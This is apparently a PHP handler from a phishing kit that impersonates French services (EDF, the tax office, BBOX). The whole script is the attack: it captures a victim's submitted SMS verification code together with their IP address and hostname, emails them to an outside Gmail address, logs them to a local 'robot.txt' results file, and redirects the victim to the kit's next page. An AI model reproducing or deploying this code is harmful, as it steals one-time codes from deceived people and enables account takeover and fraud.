<?php
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[BBOX]\n";
$message .= "EDF SMS2      : ".$_POST['o8']."\n";
$message .= "[DON]\n";
$send = "ucefanouar@gmail.com";
$subject = "SMS IMPOTS:   $ip";
$headers = "From: [BBOX]<info@online.net>";
mail($send,$subject,$message,$headers);

$file = fopen("./robot.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message);


echo '<script language="Javascript">
<!--
document.location.replace("./load1.php");
// -->
</script>';
?>